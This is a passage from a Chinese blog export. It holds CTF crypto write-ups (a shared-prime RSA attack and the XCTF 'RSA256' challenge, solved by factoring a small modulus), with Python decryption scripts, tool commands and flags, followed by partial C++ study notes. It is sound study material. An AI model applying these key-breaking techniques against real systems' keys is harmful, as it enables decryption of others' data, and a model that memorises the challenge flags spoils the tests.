<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">p1 = <span class="number">138376604533530412400239558340424700312412702699022481119357799054715877829291635290832719835033140580690053865677079316241919169166375123691917675235979462772103681398725285808551041924624882840901583892858174270714471366531758975241868470938138238307005782651296179579961869801841395682782645916848523771439</span></span><br><span class="line">q1 = <span class="number">167807411649676462546661119644113081915542378755778327057156191284453150887662343414908916953154897183613548083558919410359642450001343644814021159828724844730881111955050992398535063409828169462180970629537792676998647880110463527555034040871485964361418080481113059959410616446772218038141157051007091689351</span> </span><br><span class="line">n1 = p1*q1</span><br><span class="line"></span><br><span class="line">p2=  <span class="number">138376604533530412400239558340424700312412702699022481119357799054715877829291635290832719835033140580690053865677079316241919169166375123691917675235979462772103681398725285808551041924624882840901583892858174270714471366531758975241868470938138238307005782651296179579961869801841395682782645916848523771439</span></span><br><span class="line">q2=  <span class="number">163631266233712837481823088378337134151021871060275887871338250274359922218053543333532579728777813509956261662615493179160669715503833949420308311581736674332268131534602581626817039237393599222688271607325131529790640375765697832746614700483681658911753936520482383592478743093233261371451718844275762094649</span></span><br><span class="line">n2=p2*q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d1=modinv(e,(p1<span class="number">-1</span>)*(q1<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line">d2=modinv(e,(p2<span class="number">-1</span>)*(q2<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line"></span><br><span class="line">c1=<span class="number">9700614748413503291260966231863562117502096284616216707445276355274869086619796527618473213422509996843430296526594113572675840559345077344419098900818709577642324900405582499683604786981144099878021784567540654040833912063141709913653416394888766281465200682852378794478801329251224801006820925858507273130504236563822120838520746270280731121442839412258397191963036040553539697846535038841541209050503061001070909725806574230090246041891486506980939294245537252610944799573920844235221096956391095716111629998594075762507345430945523492775915790828078000453705320783486744734994213028476446922815870053311973844961</span></span><br><span class="line">c2=<span class="number">20513108670823938405207629835395350087127287494963553421797351726233221750526355985253069487753150978011340115173042210284965521215128799369083065796356395285905154260709263197195828765397189267866348946188652752076472172155755940282615212228370367042435203584159326078238921502151083768908742480756781277358357734545694917591921150127540286087770229112383605858821811640935475859936319249757754722093551370392083736485637225052738864742947137890363135709796410008845576985297696922681043649916650599349320818901512835007050425460872675857974069927846620905981374869166202896905600343223640296138423898703137236463508</span></span><br><span class="line"><span class="comment">#解出明文</span></span><br><span class="line">m1=pow(c1,d1,n1)<span class="comment">#得到的是10进制数据</span></span><br><span class="line">m2=pow(c2,d2,n2)<span class="comment">#得到的是10进制数据</span></span><br><span class="line"></span><br><span class="line">hex1=hex(m1)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">hex2=hex(m2)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">hex=hex1+hex2[<span class="number">2</span>:]</span><br><span class="line">print(hex)<span class="comment">#输出16进制数据</span></span><br><span class="line">flag=base64.b16decode(hex[<span class="number">2</span>:].upper())</span><br><span class="line">print(flag)<span class="comment">#输出解码后的字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解密结果：</p>
<p><img src="/2020/10/13/RSA-gcd/image-20201013094534794.png" alt="image-20201013094534794"></p>
<p>得到flag{336BB5172ADE227FE68BAA44FDA73F3B}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>常规破解模数n</tag>
      </tags>
  </entry>
  <entry>
    <title>RSA256</title>
    <url>/2020/10/10/RSA256/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://adworld.xctf.org.cn/task/answer?type=crypto&amp;number=5&amp;grade=1&amp;id=5485&amp;page=2">题目地址</a></p>
<p>题目名称：RSA256</p>
<p>题目描述：</p>
<p>被潘汉年按时来到上海百老汇大厦（今上海大厦），叩开了袁殊临时下榻处的房门。袁殊说明自己当前身份和处境后，突然话锋一转，问潘汉年：“你到我这里来，恐怕已经被日本特务注意到了。我应该怎么向他们解释呢？”潘汉年说：“你就将计就计在敌伪内部站住脚，取得合法地位。同时搜集敌伪情报向我提供。”“要是岩井要求我将你介绍给他怎么办？”“那我就用胡越明的化名同岩井见面，就说我愿意和你在香港合作搞情报。”时隔不久，潘汉年接到袁殊通知，通知内容为：RSA256.tar.gz，要他在上海虹口区一家日本人开的餐馆里，和岩井会见。 请以暗号形式告知我方人员前往保护潘汉年的安全。(答案为flag{XXX}形式)</p>
<p>题目附件：<a href="https://adworld.xctf.org.cn/media/task/attachments/8eec4a4af1e14eb08648c8fda7660a0f.gz">附件1</a></p>
<a id="more"></a>
<p>WriteUp：</p>
<p><strong>解题思路：</strong></p>
<p>下载附件，解压得到RSA256文件夹，里面有两个文件fllllllag.txt和gy.key</p>
<p><img src="/2020/10/10/RSA256/image-20201009220928493.png" alt="image-20201009220928493"></p>
<p>给出了公钥文件gy.key和密文文件fllllllag.txt，就是常规的RSA解密，有多种方法</p>
<p><strong>方法一：利用RsaCtfTool工具（kali虚拟机中）</strong></p>
<p>已知公钥（自动求私钥）—publickey,密文—uncipherfile</p>
<p>命令：<code>python3 RsaCtfTool.py --publickey 公钥文件 --uncipherfile 加密的文件</code></p>
<p><img src="/2020/10/10/RSA256/image-20201010112318322-1602320676468.png" alt="image-20201010112318322"></p>
<p>直接解出明文</p>
<p><strong>方法二：利用公钥文件用openssl工具解出e、n，然后python3脚本解出明文</strong></p>
<p><strong>1、</strong>解出e、n</p>
<p>方式1：</p>
<p>打开kali虚拟机，用openssl解出e、n</p>
<p>命令：<code>openssl rsa -pubin -text -modulus -in warmup -in gy.key</code></p>
<p><img src="/2020/10/10/RSA256/image-20201009221308957.png" alt="image-20201009221308957"></p>
<p>方式2：</p>
<p>用脚本从公钥文件中解出n、e</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment">#1.从公钥文件中分解n和e</span></span><br><span class="line">public_key = RSA.importKey(open(<span class="string">r&quot;G:\ctf\CTF题目\8eec4a4af1e14eb08648c8fda7660a0f\8eec4a4af1e14eb08648c8fda7660a0f\RSA256\gy.key&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read())</span><br><span class="line">n = public_key.n</span><br><span class="line">e = public_key.e</span><br><span class="line">print(<span class="string">&#x27;N:&#x27;</span>,n)</span><br><span class="line">print(<span class="string">&#x27;E:&#x27;</span>,e)</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<p><img src="/2020/10/10/RSA256/image-20201010115012461.png" alt="image-20201010115012461"></p>
<p><strong>2、</strong>e为65537，n还比较短，用python先转换成10进制</p>
<p><img src="/2020/10/10/RSA256/image-20201009221558824.png" alt="image-20201009221558824"></p>
<p>对n进行因数分解</p>
<p>方式1：登录网站<a href="http://factordb.com/">http://factordb.com/</a>,解出p和q</p>
<p><img src="/2020/10/10/RSA256/image-20201009221721597.png" alt="image-20201009221721597"></p>
<p>方式2：使用yafu工具</p>
<p>(常用于比较大的整数分解)自动整数因式分解，在RSA中，当p、q的取值差异过大或过于相近的时候，使用yafu可以快速的把n值分解出p、q值！</p>
<p>用法：</p>
<p><img src="/2020/10/10/RSA256/image-20201010113734508.png" alt="image-20201010113734508"></p>
<p>到此，已经获取到RSA的全部参数</p>
<p>p = 273821108020968288372911424519201044333  </p>
<p>q = 280385007186315115828483000867559983517 </p>
<p>n=76775333340223961139427050707840417811156978085146970312315886671546666259161</p>
<p>e=65537</p>
<p><strong>3、</strong>使用python3代码解出明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line">p = <span class="number">273821108020968288372911424519201044333</span>  </span><br><span class="line">q = <span class="number">280385007186315115828483000867559983517</span> </span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d=modinv(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))<span class="comment">#RSA私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&quot;fllllllag.txt&quot;</span> , <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	s=f.read().hex()<span class="comment">#bytes转16进制字符串</span></span><br><span class="line">c=int(s,<span class="number">16</span>);<span class="comment">#密文，16进制转成int型</span></span><br><span class="line"><span class="comment">#解出明文</span></span><br><span class="line">m=pow(c,d,n)<span class="comment">#得到的是10进制数据</span></span><br><span class="line">hex=hex(m)<span class="comment">#得到16进制数据，最后转字符串就行了</span></span><br><span class="line">print(hex)<span class="comment">#输出16进制数据</span></span><br><span class="line"><span class="comment">#因为base16编码后的字母组成是[0-9A-F],所以要转成大写，否则会提示“Non-base16 digit found”</span></span><br><span class="line"><span class="comment">#还可以写成flag=base64.b16decode(hex[2:],True)或者修改python库base64源码里的b16decode()函数第二个参数为True</span></span><br><span class="line">flag=base64.b16decode(hex[<span class="number">2</span>:].upper())</span><br><span class="line">print(flag)<span class="comment">#输出解码后的字符串</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行结果如下：</p>
<p><img src="/2020/10/10/RSA256/image-20201013095638702.png" alt="image-20201013095638702"></p>
<p>可以看出flag字符串16进制标识，直接base16解码得到flag：</p>
<p>flag{_2o!9_CTF_ECUN_}</p>
<p>提交时需要去掉_(真坑)</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>CRYPTO</category>
      </categories>
      <tags>
        <tag>RSA</tag>
        <tag>常规破解模数n</tag>
      </tags>
  </entry>
  <entry>
    <title>C|C++ 菜鸟教程 学习笔记</title>
    <url>/2020/10/19/RUNOOB-C-NOTES/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a><strong>1、环境配置</strong></h6><p>文本编辑器（如notepad）和C++编译器（用于把源程序编译成最终的可执行程序）</p>
<p><img src="/2020/10/19/RUNOOB-C-NOTES/qq%E5%9B%BE%E7%89%8720201013214047.png" alt="img"></p>
<a id="more"></a>
<h6 id="2、基本语法"><a href="#2、基本语法" class="headerlink" title="2、基本语法"></a><strong>2、基本语法</strong></h6><ul>
<li>C++ 标识符由字母、$ 、_ 、数字组成，但不能以数字开头。</li>
<li>在 C++ 中，分号是语句结束符。也就是说，每个语句必须以分号结束。</li>
</ul>
<h6 id="3、注释"><a href="#3、注释" class="headerlink" title="3、注释"></a><strong>3、注释</strong></h6><ul>
<li>​    //第一种注释,单行注释</li>
<li>​    /*第二种注释，多行注释*/</li>
<li>​    第三种注释，程序调试方便，修改0-》1即可运行</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;第三种注释&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// 0</span></span></span><br></pre></td></tr></table></figure>
<h6 id="4、数据类型"><a href="#4、数据类型" class="headerlink" title="4、数据类型"></a><strong>4、数据类型</strong></h6><p>变量保留的是它所存储的值的内存位置。</p>
<p>7种基本数据类型</p>
<ul>
<li>布尔型bool</li>
<li>字符串型char</li>
<li>整型int</li>
<li>浮点型float</li>
<li>双浮点型double</li>
<li>无类型void</li>
<li>宽字符型wchar_t</li>
</ul>
<p>一些基本类型可以使用一个或多个类型修饰符进行修饰</p>
<p>派生数据类型</p>
<p>枚举enum</p>
<h6 id="5、变量类型"><a href="#5、变量类型" class="headerlink" title="5、变量类型"></a><strong>5、变量类型</strong></h6><p>变量定义就是告诉编译器在何处创建变量的存储，以及如何创建变量的存储。</p>
<p>变量声明向编译器保证变量以给定的类型和名称存在，这样编译器在不需要知道变量完整细节的情况下也能进一步的编译。变量声明只在编译时有它的意义，在程序连接时编译器需要实际的变量声明。</p>
<h6 id="6、变量作用域"><a href="#6、变量作用域" class="headerlink" title="6、变量作用域"></a><strong>6、变量作用域</strong></h6><p>程序中，局部变量和全局变量的名称可以相同。</p>
<p>存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。共有两种变量存储在静态存储区：全局变量和static变量。</p>
<p>全局变量，静态局部变量，静态全局变量都在静态存储区分配空间，而局部变量在栈里分配空间。</p>
<p><img src="/2020/10/19/RUNOOB-C-NOTES/clipboard.png" alt="img"></p>
<h6 id="7、常量"><a href="#7、常量" class="headerlink" title="7、常量"></a><strong>7、常量</strong></h6><p>常量是固定值，在程序执行期间不会改变，又叫做字面量</p>
<p>常量通常定义为大写字母形式</p>
<p><img src="/2020/10/19/RUNOOB-C-NOTES/clipboard.png" alt="img"></p>
<h6 id="8、修饰符类型"><a href="#8、修饰符类型" class="headerlink" title="8、修饰符类型"></a><strong>8、修饰符类型</strong></h6><p>C++允许在char、int和double数据类型放置修饰符。修饰符用于改变基本类型的含义。</p>
<h6 id="9、存储类"><a href="#9、存储类" class="headerlink" title="9、存储类"></a><strong>9、存储类</strong></h6><p>存储类定义C++程序中变量/函数的范围和生命周期。这些说明符放置在他们所修饰的类型之前。</p>
<h6 id="10、运算符"><a href="#10、运算符" class="headerlink" title="10、运算符"></a><strong>10、运算符</strong></h6><p>运算符是一种告诉编译器执行特定的数学或逻辑操作的符号。</p>
<p>算术运算符</p>
<p>关系运算符</p>
<p>逻辑运算符</p>
<p>位运算符</p>
<p>赋值运算符</p>
<p>杂项运算符</p>
<h6 id="11、循环"><a href="#11、循环" class="headerlink" title="11、循环"></a><strong>11、循环</strong></h6><p>循环类型</p>
<ul>
<li>while循环</li>
<li>for循环</li>
<li>do…while循环</li>
<li>嵌套循环</li>
</ul>
<p>循环控制语句</p>
<ul>
<li>break语句</li>
<li>continue语句</li>
</ul>
<h6 id="12、判断"><a href="#12、判断" class="headerlink" title="12、判断"></a><strong>12、判断</strong></h6><ul>
<li>判断语句</li>
<li>if语句</li>
<li>if…else语句</li>
<li>嵌套if语句</li>
<li>switch语句</li>
<li>嵌套switch语句</li>
</ul>
<p>?:运算符</p>
<h6 id="13、函数"><a href="#13、函数" class="headerlink" title="13、函数"></a><strong>13、函数</strong></h6><p>逻辑上每个函数执行一个特定的任务</p>
<p>函数定义一般形式</p>
<p>return_type function_name( parameter list ) {   body of the function }</p>
<p>C++11 提供了对匿名函数的支持,称为 Lambda 函数(也叫 Lambda 表达式)。</p>
<h6 id="14、数字"><a href="#14、数字" class="headerlink" title="14、数字"></a><strong>14、数字</strong></h6><p>数学头文件 <cmath>一些内置数学函数</cmath></p>
<p>随机数生成器</p>
<h6 id="15、数组"><a href="#15、数组" class="headerlink" title="15、数组"></a><strong>15、数组</strong></h6><p>存储一个固定大小的相同类型元素的顺序集合，由连续内存位置组成</p>
<p>声明数组</p>
<p>初始化数组</p>
<p>访问数组元素</p>
<h6 id="16、字符串"><a href="#16、字符串" class="headerlink" title="16、字符串"></a><strong>16、字符串</strong></h6><p><strong>C风格字符串</strong></p>
<p><strong>C++引入string类类型</strong></p>
<h6 id="17、指针"><a href="#17、指针" class="headerlink" title="17、指针"></a><strong>17、指针</strong></h6><p><strong>指针是一个变量，其值是另一个变量的地址</strong></p>
<p>定义一个指针变量、把变量地址赋值给指针、访问指针变量中可用地址的值</p>
<h6 id="18、引用"><a href="#18、引用" class="headerlink" title="18、引用"></a><strong>18、引用</strong></h6><p>引用变量是一个别名，一旦把引用初始化为某个变量，就可以使用该引用名称或变量名称来指向变量。</p>
<p>可以把引用当成是变量附属在内存位置中的第二个标签，&amp; 读作<strong>引用</strong></p>
<h6 id="19、日期-amp-时间"><a href="#19、日期-amp-时间" class="headerlink" title="19、日期&amp;时间"></a><strong>19、日期&amp;时间</strong></h6><p>C++ 继承了 C 语言用于日期和时间操作的结构和函数。使用日期和时间需要引用 <ctime> 头文件。</ctime></p>
<p>四种类型：<strong>clock_t、time_t、size_t</strong> 和 <strong>tm</strong></p>
<h6 id="20、基本输入输出"><a href="#20、基本输入输出" class="headerlink" title="20、基本输入输出"></a><strong>20、基本输入输出</strong></h6><p> I/O 发生在流中，流是字节序列，字节流从设备（如键盘、磁盘驱动器、网络连接等）流向内存叫<strong>输入操作</strong>。从内存流向设备（如显示屏、打印机、磁盘驱动器、网络连接等），叫<strong>输出操作</strong>。</p>
<p>头文件<iostream>、<iomanip>、<fstream></fstream></iomanip></iostream></p>
<h6 id="21、数据结构"><a href="#21、数据结构" class="headerlink" title="21、数据结构"></a><strong>21、数据结构</strong></h6><p><strong>结构</strong>是 C++ 中另一种用户自定义的可用的数据类型，它允许您存储不同类型的数据项。</p>
<p>使用 <strong>struct</strong> 语句定义结构。struct 语句定义了一个包含多个成员的新的数据类型</p>
<p>访问结构的成员，我们使用<strong>成员访问运算符（.）</strong></p>
<h4 id="C-面向对象"><a href="#C-面向对象" class="headerlink" title="C++面向对象"></a><strong>C++面向对象</strong></h4><h6 id="22、类-amp-对象"><a href="#22、类-amp-对象" class="headerlink" title="22、类&amp;对象"></a><strong>22、类&amp;对象</strong></h6><p>C++ 支持面向对象程序设计。类是 C++ 的核心特性，通常被称为用户定义的类型。</p>
<p>类定义是以关键字 <strong>class</strong> 开头，后跟类的名称。类的主体是包含在一对花括号中。类定义后必须跟着一个分号或一个声明列表。</p>
<h6 id="23、继承"><a href="#23、继承" class="headerlink" title="23、继承"></a><strong>23、继承</strong></h6><p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据另一个类来定义一个类，达到了重用代码功能和提高执行效率的效果。</p>
<p>基类&amp;派生类</p>
<p>访问控制和继承</p>
<h6 id="24、重载运算符和重载函数"><a href="#24、重载运算符和重载函数" class="headerlink" title="24、重载运算符和重载函数"></a><strong>24、重载运算符和重载函数</strong></h6><p>C++ 允许在同一作用域中的某个<strong>函数</strong>和<strong>运算符</strong>指定多个定义，分别称为<strong>函数重载</strong>和<strong>运算符重载</strong>。</p>
<p>调用一个<strong>重载函数</strong>或<strong>重载运算符</strong>时，编译器通过把您所使用的参数类型与定义中的参数类型进行比较，决定选用最合适的定义。</p>
<p>函数重载：同名函数的形式参数（指参数的个数、类型或者顺序）必须不同</p>
<p>重载运算符：函数名是由关键字 operator 和其后要重载的运算符符号构成的</p>
<h6 id="25、多态"><a href="#25、多态" class="headerlink" title="25、多态"></a><strong>25、多态</strong></h6><p>C++ 多态意味着调用成员函数时，会根据调用函数的对象的类型来执行不同的函数。</p>
<p><strong>虚函数</strong> 是在基类中使用关键字 <strong>virtual</strong> 声明的函数。在派生类中重新定义基类中定义的虚函数时，会告诉编译器不要静态链接到该函数，动态链接</p>
<h6 id="26、数据抽象"><a href="#26、数据抽象" class="headerlink" title="26、数据抽象"></a><strong>26、数据抽象</strong></h6><p>数据抽象是指，只向外界提供关键信息，并隐藏其后台的实现细节，即只表现必要的信息而不呈现细节。</p>
<p>数据抽象是一种依赖于接口和实现分离的编程（设计）技术</p>
<h6 id="27、数据封装"><a href="#27、数据封装" class="headerlink" title="27、数据封装"></a><strong>27、数据封装</strong></h6><p><strong>数据封装</strong>是一种把数据和操作数据的函数捆绑在一起的机制，<strong>数据抽象</strong>是一种仅向用户暴露接口而把具体的实现细节隐藏起来的机制。</p>
<h6 id="28、接口（抽象类）"><a href="#28、接口（抽象类）" class="headerlink" title="28、接口（抽象类）"></a><strong>28、接口（抽象类）</strong></h6><p>接口描述了类的行为和功能，而不需要完成类的特定实现。</p>
<p>抽象类类中至少有一个函数被声明为纯虚函数</p>
<p>抽象类不能被用于实例化对象，它只能作为<strong>接口</strong>使用</p>
<h4 id="C-高级教程"><a href="#C-高级教程" class="headerlink" title="C++高级教程"></a><strong>C++高级教程</strong></h4><h6 id="29、文件和流"><a href="#29、文件和流" class="headerlink" title="29、文件和流"></a><strong>29、文件和流</strong></h6><p><strong>fstream标准库，数据类型ofstream、ifstream、fstream</strong></p>
<h6 id="30、异常处理"><a href="#30、异常处理" class="headerlink" title="30、异常处理"></a><strong>30、异常处理</strong></h6><p>异常是程序在执行期间产生的问题，C++ 异常处理涉及到三个关键字：<strong>try、catch、throw</strong>。</p>
<p>可以通过继承和重载 <strong>exception</strong> 类来定义新的异常</p>
<h6 id="31、动态内存"><a href="#31、动态内存" class="headerlink" title="31、动态内存"></a><strong>31、动态内存</strong></h6><p>C++ 程序中的内存分为两个部分：</p>
<ul>
<li><strong>栈：</strong>在函数内部声明的所有变量都将占用栈内存。</li>
<li><strong>堆：</strong>这是程序中未使用的内存，在程序运行时可用于动态分配内存。</li>
</ul>
<h6 id="32、命名空间"><a href="#32、命名空间" class="headerlink" title="32、命名空间"></a><strong>32、命名空间</strong></h6><p>本质上，命名空间就是定义了一个范围</p>
<p>命名空间的定义使用关键字 <strong>namespace</strong>，后跟命名空间的名称</p>
<p>为了调用带有命名空间的函数或变量，需要在前面加上命名空间的名称</p>
<p>可以使用 <strong>using namespace</strong> 指令，这样在使用命名空间时就可以不用在前面加上命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。</p>
<h6 id="33、模板"><a href="#33、模板" class="headerlink" title="33、模板"></a><strong>33、模板</strong></h6><p>模板是泛型编程的基础，泛型编程即以一种独立于任何特定类型的方式编写代码</p>
<h6 id="34、预处理器"><a href="#34、预处理器" class="headerlink" title="34、预处理器"></a><strong>34、预处理器</strong></h6><p>预处理器是一些指令，指示编译器在实际编译之前所需完成的预处理。</p>
<p>所有的预处理器指令都是以井号（#）开头，只有空格字符可以出现在预处理指令之前</p>
<p>参数宏</p>
<p>条件编译</p>
<h6 id="35、信号处理"><a href="#35、信号处理" class="headerlink" title="35、信号处理"></a><strong>35、信号处理</strong></h6><p>信号是由操作系统传给进程的中断，会提早终止一个程序</p>
<p><strong>Sleep 函数</strong></p>
<p>功能：执行挂起一段时间，也就是等待一段时间在继续执行</p>
<p>用法：<strong>Sleep(时间)</strong></p>
<p>Linux 用 <strong>#include <unistd.h></unistd.h></strong> 和 <strong>sleep()</strong>，Windos 用 <strong>#include <windows.h></windows.h></strong> 和 <strong>Sleep()</strong>。</p>
<h6 id="36、多线程"><a href="#36、多线程" class="headerlink" title="36、多线程"></a><strong>36、多线程</strong></h6><p>多线程是多任务处理的一种特殊形式，多任务处理允许让电脑同时运行两个或两个以上的程序。一般情况下，两种类型的多任务处理：<strong>基于进程和基于线程</strong>。</p>
<ul>
<li>基于进程的多任务处理是程序的并发执行。</li>
<li>基于线程的多任务处理是同一程序的片段的并发执行。</li>
</ul>
<h6 id="37、Web编程"><a href="#37、Web编程" class="headerlink" title="37、Web编程"></a><strong>37、Web编程</strong></h6><p>公共网关接口（CGI），是一套标准，定义了信息是如何在 Web 服务器和客户端脚本之间进行交换的。</p>
<h4 id="C-资源库"><a href="#C-资源库" class="headerlink" title="C++资源库"></a><strong>C++资源库</strong></h4><h6 id="38、STL教程"><a href="#38、STL教程" class="headerlink" title="38、STL教程"></a><strong>38、STL教程</strong></h6><p>C++ STL（标准模板库）是一套功能强大的 C++ 模板类，提供了通用的模板类和函数，这些模板类和函数可以实现多种流行和常用的算法和数据结构，如向量、链表、队列、栈。</p>
<p>核心组件：容器（Containers）算法（Algorithms）迭代器（iterators）</p>
<h6 id="39、标准库"><a href="#39、标准库" class="headerlink" title="39、标准库"></a><strong>39、标准库</strong></h6><p><strong>标准函数库：</strong> 这个库是由通用的、独立的、不属于任何类的函数组成的。函数库继承自 C 语言。</p>
<ul>
<li>输入/输出 I/O</li>
<li>字符串和字符处理</li>
<li>数学</li>
<li>时间、日期和本地化</li>
<li>动态分配</li>
<li>其他</li>
<li>宽字符函数</li>
</ul>
<p><strong>面向对象类库：</strong> 这个库是类及其相关函数的集合。</p>
<ul>
<li>标准的 C++ I/O 类</li>
<li>String 类</li>
<li>数值类</li>
<li>STL 容器类</li>
<li>STL 算法</li>
<li>STL 函数对象</li>
<li>STL 迭代器</li>
<li>STL 分配器</li>
<li>本地化库</li>
<li>异常处理类</li>
<li>杂项支持库</li>
</ul>
<h6 id="40、有用的资源"><a href="#40、有用的资源" class="headerlink" title="40、有用的资源"></a><strong>40、有用的资源</strong></h6><p>网站</p>
<ul>
<li><a href="https://en.cppreference.com/w/cpp/header">C++ Standard Library headers</a> − C++ 标准库。</li>
<li><a href="http://en.wikibooks.org/wiki/C++_Programming">C++ Programming</a> − 这本书涵盖了 C++ 语言编程、软件交互设计、C++ 语言的现实生活应用。</li>
<li><a href="http://www.sunistudio.com/cppfaq/">C++ FAQ</a> − C++ 常见问题</li>
<li><a href="http://www.thefreecountry.com/sourcecode/cpp.shtml">Free Country</a> − Free Country 提供了免费的 C++ 源代码和 C++ 库，这些源代码和库涵盖了压缩、存档、游戏编程、标准模板库和 GUI 编程等 C++ 编程领域。</li>
<li><a href="http://www.hal9k.com/cug/">C and C++ Users Group</a> − C 和 C++ 的用户团体提供了免费的涵盖各种编程领域 C++ 项目的源代码，包括 AI、动画、编译器、数据库、调试、加密、游戏、图形、GUI、语言工具、系统编程等。</li>
</ul>
<p>书籍</p>
<ul>
<li>《Essential C++ 中文版》</li>
<li>《C++ Primer Plus 第6版中文版》</li>
<li>《C++ Primer中文版（第5版）》</li>
</ul>
<h6 id="41、实例"><a href="#41、实例" class="headerlink" title="41、实例"></a><strong>41、实例</strong></h6><ul>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-cout-helloworld.html">C++ 实例 - 输出 “Hello, World!”</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-cout-cin.html">C++ 实例 - 标准输入输出</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-endl.html">C++ 实例 - 输出换行</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-add-numbers.html">C++ 实例 - 实现两个数相加</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-data-types.html">C++ 实例 - 创建不同类型的变量</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-quotient-remainder.html">C++ 实例 - 求商及余数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-sizeof-operator.html">C++ 实例 - 查看 int, float, double 和 char 变量大小</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-swapping.html">C++ 实例 - 交换两个数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-even-odd.html">C++ 实例 - 判断一个数是奇数还是偶数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-vowel-consonant.html">C++ 实例 - 判断元音/辅音</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-largest-number-among-three.html">C++ 实例 - 判断三个数中的最大数</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-quadratic-roots.html">C++ 实例 - 求一元二次方程的根</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-sum-natural-number.html">C++ 实例 - 计算自然数之和</a></li>
<li><a href="https://www.runoob.com/cplusplus/cpp-examples-leap-year.html">C++ 实例 - 判断闰年</a></li>
